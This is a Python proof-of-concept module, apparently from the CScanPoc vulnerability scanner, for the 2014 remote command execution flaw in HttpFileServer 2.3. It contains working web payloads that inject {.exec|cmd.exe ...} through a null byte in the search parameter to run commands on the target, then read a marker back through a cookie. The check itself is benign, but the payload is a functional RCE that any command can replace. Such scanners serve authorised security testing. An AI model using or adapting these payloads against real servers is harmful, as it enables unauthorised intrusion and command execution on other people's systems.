# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request, urllib.parse, urllib.error
import urllib.request, urllib.error, urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'HFS_0001_p'  # 平台漏洞编号，留空
    name = 'HFS(HttpFileServer)命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2014-09-15'  # 漏洞公布时间
    desc = '''
        HFS(HttpFileServer)设计缺陷,导致命令执行漏洞的产生,严重影响网站服务器安全.
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-88860'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'HttpFileServer'  # 漏洞应用名称
    product_version = '2.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1b028f10-aa77-4fe2-b6bb-e4933546e55b'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-04'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            exec_payload = "/?search==%00{.exec|cmd.exe /c del res.}{.exec|cmd.exe /c echo>res 123456test.}"
            check_payload = "/?search==%00{.cookie|out|value={.load|res.}.}"

            attack_url = self.target

            s = requests.Session()
            s.get(attack_url+exec_payload, headers={})
            r = s.get(attack_url+check_payload, headers={})
            check_cookie = r.headers.get(
                'set-cookie') if r.headers.get('set-cookie') else ""
            if "123456test" in check_cookie:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
